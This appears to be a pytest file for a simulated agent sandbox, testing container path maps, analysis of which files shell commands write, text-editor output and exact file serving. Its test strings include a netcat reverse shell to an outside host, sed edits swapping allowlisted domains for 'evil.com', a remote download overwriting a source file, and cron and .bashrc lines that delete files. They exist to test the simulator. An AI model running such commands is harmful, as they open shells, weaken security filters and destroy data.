"""Deterministic file layer: container path map, write analysis, exact editor semantics, serving."""

import json
from pathlib import Path

import pytest
from inspect_ai.tool._sandbox_tools_utils.sandbox import SANDBOX_TOOLS_CLI
from simfakes import ENVS, ScriptedModel, bash_reply, make_sim, needs_envs, trace

from simrt import text_editor_ops
from simrt.container_map import ContainerImage
from simrt.file_layer import FileLayer
from simrt.shell_effects import command_effects, mentioned_paths
from simrt.sim_sandbox import SimulatedSandbox
from simrt.simulator import BashResult

URL_FILTER = "/app/node/src/url_filter.js"
SNAP_URL_FILTER = ENVS / "web_scraping" / "codebase" / "src" / "node" / "src" / "url_filter.js"


# ---- container path map ---------------------------------------------------------------------------
@needs_envs
def test_web_scraping_paths_map_to_snapshot() -> None:
    img = ContainerImage.load(ENVS / "web_scraping" / "codebase")
    assert img.source_of(URL_FILTER) == "src/node/src/url_filter.js"
    assert img.source_of("/app/node/src/worker/tasks.js") == "src/node/src/worker/tasks.js"
    assert img.source_of("/app/restart.sh") == "src/restart.sh"
    assert img.source_of("/etc/vsftpd.conf") == "src/vsftpd.conf"
    assert img.source_of("/app/node/package-lock.json") == "src/node/package-lock.json"  # re-copied after npm install
    assert img.source_of("/app/node/src") is None  # directories are not files
    assert img.workdir == "/app" and img.user == "root" and "Ubuntu 22.04" in img.os_description()
    assert not img.volatile


@needs_envs
def test_clinical_trial_runtime_rewrites_are_volatile() -> None:
    img = ContainerImage.load(ENVS / "clinical_trial" / "codebase")
    assert img.source_of("/app/patient_portal/app.py") == "patient_portal/app.py"
    assert img.source_of("/app/analysis/status_report.R") == "src/analysis/status_report.R"
    assert img.source_of("/etc/cron.d/monitoring-crontab") == "my-crontab"
    for path in ("/app/notebooks/check_thresholds.ipynb", "/app/notebooks/predict_blood_tests.ipynb"):
        assert img.source_of(path) is None and path in img.volatile  # rewritten by cron / start-up
    # entrypoint.sh copies the seed data to /root and then `rm -f /tmp/seed_data.sql`: gone, not volatile
    assert img.deleted == {"/tmp/seed_data.sql": "init/db/seed_data.sql"} and "/tmp/seed_data.sql" not in img.volatile
    assert "/tmp/seed_data.sql" not in dict(img.lookup_map())
    assert any(line.startswith("*/5 * * * *") and "check_thresholds" in line for line in img.cron)
    assert "rocker/tidyverse" in img.os_description() and "Ubuntu" not in img.os_description()


def test_dockerfile_rules(tmp_path: Path) -> None:
    files = {
        "package.json": "{}",
        "src/main.py": "open('/app/src/state.json', 'w').write('{}')\n",
        "src/state.json": "{}",
        "src/patched.py": "a = 1\n",
        "src/util.py": "x = 1\n",
        "src/out.js": "snapshot\n",
        "tools/run.sh": "#!/bin/sh\n",
        "conf/app.ini": "[a]\n",
        "crontab": "* * * * * root echo hi > /app/src/util.py\n",
        "compose.yml": "services:\n  default:\n    build: .\n    command: python3 /app/src/main.py\n"
        "    volumes:\n      - ./conf/app.ini:/etc/app.ini:ro\n      - data:/var/data\n",
        "Dockerfile": "FROM node:20 AS build\nCOPY src/ /build/\nFROM ubuntu:jammy\nWORKDIR /app\n"
        "COPY package*.json ./\nRUN npm install\nCOPY src/ src/\n"
        "COPY --from=build /build/out.js /app/src/out.js\nCOPY tools/run.sh /usr/local/bin/run\n"
        "RUN chmod +x /usr/local/bin/run && \\\n    sed -i 's/a/b/' /app/src/patched.py\n"
        "COPY crontab /etc/cron.d/jobs\n",
    }
    for rel, text in files.items():
        (tmp_path / rel).parent.mkdir(parents=True, exist_ok=True)
        (tmp_path / rel).write_text(text)
    img = ContainerImage.load(tmp_path)
    assert "/build/main.py" not in img.files  # earlier build stage
    assert "/app/package.json" in img.volatile  # npm install ran after the copy
    assert img.source_of("/app/src/main.py") == "src/main.py"
    assert img.source_of("/app/src/out.js") is None  # COPY --from: not snapshot content
    assert img.source_of("/usr/local/bin/run") == "tools/run.sh"  # file copied under a new name
    assert "/app/src/patched.py" in img.volatile  # sed -i in a later RUN
    assert "/app/src/state.json" in img.volatile  # written by the start-up command's script
    assert "/app/src/util.py" in img.volatile  # written by a cron job
    assert img.source_of("/etc/app.ini") == "conf/app.ini"  # bind mount
    assert img.cron == ["* * * * * (as root)  echo hi > /app/src/util.py"]
    assert dict(img.lookup_map())["/app/src"] == "src"


# ---- which files can a command write ---------------------------------------------------------------
FILES = ["/app/a.py", "/app/new.py", "/app/x.py", URL_FILTER, "/etc/passwd"]
ALL = set(FILES)


@pytest.mark.parametrize(
    "command,written",
    [
        ("cat /app/a.py | head -50", set()),
        ("sed -n 1,20p /app/a.py && grep -rn foo /app", set()),
        ("sed -i s/a/b/ /app/a.py", {"/app/a.py"}),
        ("echo hi > /app/new.py && ls", {"/app/new.py"}),
        ("cat > /app/x.py << 'EOF'\nimport os\nos.remove('/etc/passwd')  # it's data\nEOF\nls", {"/app/x.py"}),
        ("cd /app/node/src && sed -i s/x/y/ url_filter.js", {URL_FILTER}),
        ("rm -rf /app/node/src/*.bak", {URL_FILTER}),
        ("x=$(cat /app/a.py); echo \"$x\" > /app/new.py", {"/app/new.py"}),
        ("F=/app/a.py; sed -i s/1/2/ $F", {"/app/a.py"}),
        ("bash -c 'rm /app/a.py'", {"/app/a.py"}),
        ("curl -s http://localhost:3000/api/health; psql -c 'select 1'", set()),
        ("curl -o /app/x.py http://host/y", {"/app/x.py"}),
        ("chmod +x /app/a.py && mkdir -p /app/q", set()),
        ("for f in /app/*.py; do echo $f; done; git status", set()),
        ("python3 -c 'print(1)'", ALL),
        ("cd /app/node && npm test", ALL),
        ("git checkout .", ALL),
        ("echo $HOME > $OUT", ALL),
        ('echo "unterminated', ALL),
        ("systemctl restart nginx", ALL),
        ("find /app -name '*.pyc' -delete", ALL),
        ("./restart.sh", ALL),
        # combined short options and other write options (review findings)
        (f"sed -ri 's/a/b/' {URL_FILTER}", {URL_FILTER}),
        (f"sed -Ei 's/example\\.org/evil.org/' {URL_FILTER}", {URL_FILTER}),
        ("cd /app/node/src && sed -ni.bak 's/a/b/p' url_filter.js", {URL_FILTER}),
        (f"curl -sSLo {URL_FILTER} http://x/y", {URL_FILTER}),
        (f"curl -fsSL -o{URL_FILTER} http://x/y", {URL_FILTER}),
        ("cd /app/node/src && curl -sO http://packages-cdn.com/url_filter.js", {URL_FILTER}),
        ("sort -uo /app/a.py /tmp/x", {"/app/a.py"}),
        (f"yq -i '.a = 1' {URL_FILTER}", {URL_FILTER}),
        (f"xxd -r /tmp/h {URL_FILTER}", {URL_FILTER}),
        ("history -w /app/a.py", {"/app/a.py"}),
        ("psql -c '\\o /app/a.py' -c 'select 1'", {"/app/a.py"}),
        ("awk '{print > \"/app/a.py\"}' /tmp/in", ALL),
        ("sed 's/x/y/w /app/new.py' /tmp/in", ALL),
        ("nc -e /bin/sh packages-cdn.com 4444", ALL),
        ("redis-cli CONFIG SET dir /app/node/src", ALL),
        ("sqlite3 /tmp/db '.shell rm /app/a.py'", ALL),
        # readers stay readers
        ("sed -n '1,20p' /app/a.py; sed -e 's/a/b/' /app/x.py | head", set()),
        ("awk '$3 > 100 {print $1}' /app/a.py; awk -F: '/x|y/ {print $1}' /etc/passwd", set()),
        ("sort -nr /app/a.py | uniq -c; tree -L 2 /app; less /app/a.py", set()),
        ("curl -s -H 'Accept: application/json' http://localhost:3000/api/x; wget -qO- http://x/a.py", set()),
        ("nc -lvnp 4444; nc -zv packages-cdn.com 4444; redis-cli GET key; xxd /app/a.py | head", set()),
        # bash arrays: elements are data, not commands
        ('files=(/app/a.py "/app/x y.py"); echo "${#files[@]}"', set()),
        ("arr=(a b) && rm /app/a.py", {"/app/a.py"}),
        ('[ "$v" = "(" ] && rm /app/a.py', ALL),  # not an array (rm not skipped); a quoted ( splits: conservative
        ('files=(/app/a.py); rm "${files[@]}"', ALL),
    ],
)
def test_agent_command_write_analysis(command: str, written: set[str]) -> None:
    eff = command_effects(command, "/app")
    assert {f for f in FILES if eff.covers(f)} == written


def test_static_analysis_follows_image_scripts() -> None:
    scripts = {"/app/start.sh": "python3 /app/w.py &\nrm -f /tmp/x\n", "/app/w.py": "open('/app/data.json', 'w')"}
    eff = command_effects("bash /app/start.sh", "/", read_script=scripts.get)
    assert not eff.everything
    assert eff.covers("/app/data.json") and eff.covers("/tmp/x")
    assert not eff.covers("/app/start.sh") and not eff.covers("/app/w.py")


def test_mentioned_paths_resolve_cwd_and_globs() -> None:
    paths, globs = mentioned_paths("cat /app/a.py && cd /app/node/src && grep x url_filter.js /app/*.js", "/app")
    assert {"/app/a.py", URL_FILTER} <= paths and globs == {"/app/*.js"}


# ---- exact text_editor semantics (inspect-sandbox-tools v5) ----------------------------------------
def test_str_replace_matches_real_tool() -> None:
    out = text_editor_ops.apply(
        {"command": "str_replace", "path": "/x.py", "old_str": "e", "new_str": "E1\nE2"}, "a\n\tb\nc\nd\ne\nf\ng\nh\ni\nj\n"
    )
    numbered = "".join(f"{i:6}\t{t}\n" for i, t in enumerate(["a", "        b", "c", "d", "E1", "E2", "f", "g", "h", "i"], 1))
    assert out is not None and out.ok
    assert out.text == (
        "The file /x.py has been edited. Here's the result of running `cat -n` on a snippet of /x.py:\n"
        + numbered
        + "Review the changes and make sure they are as expected. Edit the file again if necessary."
    )
    assert out.new_content == "a\n        b\nc\nd\nE1\nE2\nf\ng\nh\ni\nj\n"  # tabs expanded in the whole file


def test_editor_errors_match_real_tool() -> None:
    def run(params: dict[str, object], content: str | None = "x = 1\ny = x\n") -> str | None:
        out = text_editor_ops.apply({"path": "/x.py", **params}, content)
        return None if out is None else (out.text if not out.ok else "OK")

    assert run({"command": "str_replace", "old_str": "x", "new_str": "z"}) == (
        "No replacement was performed. Multiple occurrences of old_str `x` in lines [1, 2]. Please ensure it is unique"
    )
    assert run({"command": "str_replace", "old_str": "q"}) == (
        "No replacement was performed, old_str `q` did not appear verbatim in /x.py."
    )
    assert run({"command": "str_replace", "old_str": ""}, None) == (
        "str_replace: The `old_str` parameter cannot be empty. Consider using the `insert` command instead."
    )
    assert run({"command": "create", "file_text": "a"}) == (
        "File already exists at: /x.py. Cannot overwrite files using command `create`."
    )
    assert run({"command": "insert", "insert_line": 9, "new_str": "z"}) == (
        "Invalid `insert_line` parameter: 9. It should be within the range of lines of the file: [0, 3]"
    )
    assert run({"command": "view", "view_range": [0, 1]}) == (
        "Invalid `view_range`: [0, 1]. Its first element `0` should be within the range of lines of the file: [1, 3]"
    )
    assert run({"command": "view", "view_range": [3, 2]}) == (
        "Invalid `view_range`: [3, 2]. Its second element `2` should be larger or equal than its first `3`"
    )
    assert run({"command": "view"}, None) is None  # unknown file: left to the model
    assert run({"command": "undo_edit"}) is None
    assert text_editor_ops.apply({"command": "view", "path": "rel.py"}, "a") is None  # relative path


def test_view_and_insert_outputs() -> None:
    view = text_editor_ops.apply({"command": "view", "path": "/x.py", "view_range": [2, 99]}, "a\r\nb\r\nc")
    assert view is not None and view.text == "Here's the result of running `cat -n` on /x.py:\n     2\tb\n     3\tc\n"
    big = text_editor_ops.apply({"command": "view", "path": "/x.py"}, "x" * 20_000)
    assert big is not None and big.text.split("\n")[1] == "     1\t" + "x" * 16_000 + text_editor_ops.TRUNCATED_MESSAGE
    ins = text_editor_ops.apply({"command": "insert", "path": "/x.py", "insert_line": 1, "new_str": "X"}, "1\n2\n3")
    assert ins is not None and ins.new_content == "1\nX\n2\n3"
    assert ins.text == (
        "The file /x.py has been edited. Here's the result of running `cat -n` on a snippet of the edited file:\n"
        "     1\t1\n     2\tX\n     3\t2\n     4\t3\n"
        "Review the changes and make sure they are as expected (correct indentation, no duplicate lines, etc). "
        "Edit the file again if necessary."
    )


# ---- serving through the simulated sandbox ---------------------------------------------------------
def _box(sim, monkeypatch: pytest.MonkeyPatch) -> SimulatedSandbox:  # type: ignore[no-untyped-def]
    box = SimulatedSandbox(sim)
    monkeypatch.setattr(box, "_announce_trace", lambda: None)
    return box


async def _editor(box: SimulatedSandbox, params: dict[str, object]) -> dict[str, object]:
    req = {"jsonrpc": "2.0", "method": "text_editor", "params": params, "id": 1}
    return json.loads((await box.exec([SANDBOX_TOOLS_CLI, "exec"], input=json.dumps(req), user="root")).stdout)


@needs_envs
async def test_snapshot_file_read_and_edited_without_model(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    m = ScriptedModel([bash_reply("ok")])
    sim = make_sim(monkeypatch, tmp_path, {"main": m})
    box = _box(sim, monkeypatch)
    before = await box.read_file(URL_FILTER)  # what ct's text_editor wrapper does before str_replace
    assert before == SNAP_URL_FILTER.read_text() and await box.read_file(URL_FILTER, text=False) == SNAP_URL_FILTER.read_bytes()
    old, new = "    'example.org',\n", "    'example.org',\n    'docs.python.org',\n"
    body = await _editor(box, {"command": "str_replace", "path": URL_FILTER, "old_str": old, "new_str": new})
    assert str(body["result"]).startswith(f"The file {URL_FILTER} has been edited.")
    assert await box.read_file(URL_FILTER) == before.replace(old, new)
    assert "docs.python.org" in sim.history[-2].text and "has been edited" in sim.history[-1].text
    missing = await _editor(box, {"command": "str_replace", "path": URL_FILTER, "old_str": "loadAllowlistConfig"})
    assert missing["error"]["message"] == (  # type: ignore[index]
        f"No replacement was performed, old_str `loadAllowlistConfig` did not appear verbatim in {URL_FILTER}."
    )
    exists = await _editor(box, {"command": "create", "path": "/app/restart.sh", "file_text": "x"})
    assert "File already exists at: /app/restart.sh" in exists["error"]["message"]  # type: ignore[index]
    assert m.calls == []
    await box.exec(["bash", "--login", "-c", "ls"])  # the harness reads are noted for the simulator
    seen = "\n".join(msg.text for msg in m.calls[0].input)
    assert "[harness] the tool harness read /app/node/src/url_filter.js directly" in seen


@needs_envs
async def test_bash_gets_ground_truth_and_writes_invalidate(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    m = ScriptedModel([bash_reply("12:        return ALLOWED_DOMAINS.includes(urlObj.hostname);"), bash_reply(), bash_reply()])
    sim = make_sim(monkeypatch, tmp_path, {"main": m})
    await sim.bash(f"grep -n includes {URL_FILTER}")
    assert "[ground truth]" in m.calls[0].prompt and "const ALLOWED_DOMAINS = [" in m.calls[0].prompt
    assert "const ALLOWED_DOMAINS" not in sim.history[-2].text and "was attached" in sim.history[-2].text
    await sim.bash(f"sed -i s/example.com/evil.com/ {URL_FILTER}")
    assert sim.read_exact(URL_FILTER) is None and sim.read_exact("/app/node/src/config.js") is not None
    await sim.bash("python3 /tmp/patch.py")
    assert sim.read_exact("/app/node/src/config.js") is None


@needs_envs
async def test_written_and_created_files_become_exact(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    m = ScriptedModel(["<result>\nFile created successfully at: /app/cfg.json\n</result>"])
    sim = make_sim(monkeypatch, tmp_path, {"main": m})
    box = _box(sim, monkeypatch)
    await box.write_file("/app/new.py", "a = 1\nb = 2\n")
    edit = await _editor(box, {"command": "str_replace", "path": "/app/new.py", "old_str": "b = 2", "new_str": "b = 3"})
    assert "has been edited" in str(edit["result"]) and await box.read_file("/app/new.py") == "a = 1\nb = 3\n"
    await _editor(box, {"command": "create", "path": "/app/cfg.json", "file_text": '{"a": 1}\n'})  # model answers
    view = await _editor(box, {"command": "view", "path": "/app/cfg.json"})  # now exact, no model call
    assert view["result"] == 'Here\'s the result of running `cat -n` on /app/cfg.json:\n     1\t{"a": 1}\n     2\t\n'
    assert len(m.calls) == 1


@needs_envs
async def test_setup_scripts_and_volatile_files(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    sim = make_sim(monkeypatch, tmp_path, {})
    setup = (ENVS / "web_scraping" / "main_tasks" / "allowlist_config" / "setup.sh").read_text()
    sim.record_setup_script(setup)  # restarts services and starts a proxy: source files unchanged
    assert sim.read_exact(URL_FILTER) is not None
    sim.record_setup_script(f"sed -i 's/a/b/' {URL_FILTER}")
    assert sim.read_exact(URL_FILTER) is None
    clinical = make_sim(monkeypatch, tmp_path, {}, env_id="clinical_trial")
    assert clinical.read_exact("/app/notebooks/check_thresholds.ipynb") is None  # rewritten by cron
    assert clinical.read_exact("/app/patient_portal/app.py") is not None


@needs_envs
async def test_flag_restores_old_behaviour(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    m = ScriptedModel([bash_reply("model text")])
    sim = make_sim(monkeypatch, tmp_path, {"main": m}, deterministic_files=False)
    assert await _box(sim, monkeypatch).read_file(URL_FILTER) == "model text\n"
    assert len(m.calls) == 1 and "[ground truth]" not in m.calls[0].prompt


@needs_envs
async def test_hook_writes_invalidate_everything(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    m = ScriptedModel([bash_reply(), "<result>\nFile created successfully at: /root/.bashrc\n</result>"])
    sim = make_sim(monkeypatch, tmp_path, {"main": m})
    await sim.bash("echo '* * * * * root rm -rf /app/node' > /etc/cron.d/cleanup")  # a new cron job
    assert sim.read_exact(URL_FILTER) is None
    other = make_sim(monkeypatch, tmp_path, {"main": m})
    await other.editor({"command": "create", "path": "/root/.bashrc", "file_text": "rm -f /app/restart.sh\n"})
    assert other.read_exact("/app/restart.sh") is None  # sourced by every later `bash --login -c`


@needs_envs
async def test_binary_raw_write_is_not_exact(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    sim = make_sim(monkeypatch, tmp_path, {})
    box = _box(sim, monkeypatch)
    await box.write_file("/app/blob.bin", b"\xff\xfe\x00raw")
    await box.write_file("/app/text.txt", "café\n".encode())
    assert sim.read_exact("/app/blob.bin") is None and sim.read_exact("/app/text.txt") == "café\n".encode()


# ---- plain bash reads of known files are answered exactly (README: "served without the model") -----
def _reads_layer() -> FileLayer:
    layer = FileLayer(ContainerImage(workdir="/app"))
    layer.known.update({"/app/a.txt": "1\n2\n3\n4\n5\n", "/app/b.txt": "x\ny", "/app/dir/c.js": "c\n"})
    return layer


@pytest.mark.parametrize(
    "command,stdout",
    [
        ("cat /app/a.txt", "1\n2\n3\n4\n5\n"),
        ("cat a.txt /app/b.txt", "1\n2\n3\n4\n5\nx\ny"),  # relative to cwd; no newline added
        ("cat ./a.txt 2>/dev/null || echo 'File not found'", "1\n2\n3\n4\n5\n"),  # `||` part never runs
        ('cat /app/b.txt && echo "---" && cat /app/dir/c.js', "x\ny---\nc\n"),
        ("head -n 2 /app/a.txt", "1\n2\n"),
        ("head -2 /app/a.txt", "1\n2\n"),
        ("head /app/b.txt", "x\ny"),
        ("tail -n 2 /app/a.txt", "4\n5\n"),
        ("tail -n +4 /app/a.txt", "4\n5\n"),
        ("tail -1 /app/b.txt", "y"),
        ("tail -n 0 /app/a.txt", ""),
        ("cat /app/a.txt | head -3 | tail -n1", "3\n"),
        ("sed -n '2,3p' /app/a.txt", "2\n3\n"),
        ("sed -n 4p /app/a.txt", "4\n"),
        ("sed -n '4,$p' /app/a.txt", "4\n5\n"),
        ("sed -n '4,2p' /app/a.txt", "4\n"),  # N,M with M < N: line N only
        ("cat /app/b.txt | sed -n 2p", "y"),
        ("cat /app/a.txt 2>&1 | head -n1;", "1\n"),
        ("cat \\\n  /app/dir/c.js", "c\n"),
    ],
)
def test_plain_reads_of_known_files_are_answered_exactly(command: str, stdout: str) -> None:
    assert _reads_layer().serve_read(command, "/app") == stdout


@pytest.mark.parametrize(
    "command",
    [
        "cat /app/missing.txt", "cat /app/a.txt /app/missing.txt", "cat -n /app/a.txt", "cat", "cat /app/*.txt",
        "cat $F", "cat ~/a.txt", "cat /app/a.txt > /tmp/x", "cat < /app/a.txt", "cat /app/a.txt &",
        "(cat /app/a.txt)", "head -c 5 /app/a.txt", "head -n -2 /app/a.txt", "head -n +2 /app/a.txt",
        "head /app/a.txt /app/b.txt", "tail -f /app/a.txt", "tail -n +0 /app/a.txt", "sed -n 0p /app/a.txt",
        "sed -i 2d /app/a.txt", "sed 2p /app/a.txt", "grep 1 /app/a.txt", "wc -l /app/a.txt", "echo x",
        "echo -n x; cat /app/a.txt", "cat /app/a.txt |", "cat /app/a.txt &&", "; cat /app/a.txt",
        "cat /app/a.txt;; cat /app/b.txt", 'cat "/app/a.txt', "cat /app/a.txt | grep 1", "cat /app/a.txt `x`",
        "cat /app/{a,b}.txt", "LC_ALL=C cat /app/a.txt", "cat /app/a.txt # note", 'cat "$(echo /app/a.txt)"',
        "cat /app/dir/../a.txt",
    ],
)
def test_other_commands_are_not_served(command: str) -> None:
    assert _reads_layer().serve_read(command, "/app") is None


@needs_envs
async def test_bash_reads_of_known_files_make_no_model_call(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    m = ScriptedModel([bash_reply("12: match"), bash_reply("as another user")])
    sim = make_sim(monkeypatch, tmp_path, {"main": m})
    exact = SNAP_URL_FILTER.read_text()
    assert await sim.bash(f"cat {URL_FILTER}", user="root") == BashResult(0, exact, "")
    head = await _box(sim, monkeypatch).exec(
        ["bash", "--login", "-c", f"head -n 5 {URL_FILTER} 2>/dev/null || echo 'File not found'"], user="root", timeout=120
    )
    assert head.stdout == "".join(f"{line}\n" for line in exact.split("\n")[:5]) and m.calls == []
    assert exact[:200] in sim.history[1].text and [t["kind"] for t in trace(sim) if t.get("deterministic")] == ["bash"] * 2
    await sim.bash(f"grep -n includes {URL_FILTER} | head -1")  # not a plain read: the model, file attached
    assert len(m.calls) == 1 and "[ground truth]" in m.calls[0].prompt
    assert (await sim.bash(f"cat {URL_FILTER}", user="nobody")).stdout == "as another user"  # permissions unknown
    off = make_sim(monkeypatch, tmp_path, {"main": ScriptedModel([bash_reply("model text")])}, deterministic_files=False)
    assert (await off.bash(f"cat {URL_FILTER}")).stdout == "model text"
